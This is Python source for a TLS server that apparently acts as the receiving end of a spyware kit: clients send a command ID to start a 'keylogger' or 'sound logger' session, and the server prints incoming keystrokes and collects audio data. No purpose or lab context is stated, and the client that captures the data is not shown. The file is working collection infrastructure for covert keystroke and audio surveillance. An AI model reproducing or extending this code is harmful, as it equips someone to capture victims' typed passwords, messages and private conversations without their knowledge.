import socket
import ssl
from threading import Thread

SERVER_ADDRESS = '127.0.0.1'
SERVER_PORT = 12345
SERVER_CERT = './keys/server.crt'
PRIVATE_KEY = './keys/server.key'
CLIENT_CERT = './keys/client.crt'
START_KEY_LOGGER = '9bbbbd52-a8c7-4e2a-a7e2-82d74c0694e2'
START_SOUND_LOGGER = '24176171-0c93-4d8f-b328-4ce93bf91c35'
STOP_ID = b'8e97edbb-7624-4279-9c1f-553576b0e53a'

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.verify_mode = ssl.CERT_REQUIRED
context.load_cert_chain(certfile=SERVER_CERT, keyfile=PRIVATE_KEY)
context.load_verify_locations(cafile=CLIENT_CERT)

bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bindsocket.bind((SERVER_ADDRESS, SERVER_PORT))
bindsocket.listen(5)


class Client(Thread):
    def __init__(self, _socket, address):
        Thread.__init__(self)
        self.addr = address
        self.conn = context.wrap_socket(_socket, server_side=True)
        self.start()

    def read_keys(self):
        print('Starting keylogger')
        while True:
            char_in = self.conn.recv(4096).decode()
            if not char_in:
                print('Stopping keylogger')
                break
            else:
                print('Keylogger: ' + char_in)
                self.conn.sendall(b'Ok')

    def record_sound(self):
        print('Starting sound recorder')
        while True:
            data = self.conn.recv(4096)
            if not data:
                print('Stopping sound recorder')
                break
            else:
                #Do something
                self.conn.send(b'Ok')

    def run(self):
        try:
            init_command = self.conn.recv(36).decode()
            if init_command == START_KEY_LOGGER:
                self.read_keys()
            elif init_command == START_SOUND_LOGGER:
                self.record_sound()
        except ConnectionResetError:
            self.conn.shutdown(socket.SHUT_RDWR)
            self.conn.close()
        except ConnectionAbortedError:
            pass


while True:
    client_socket, client_address = bindsocket.accept()
    Client(client_socket, client_address)
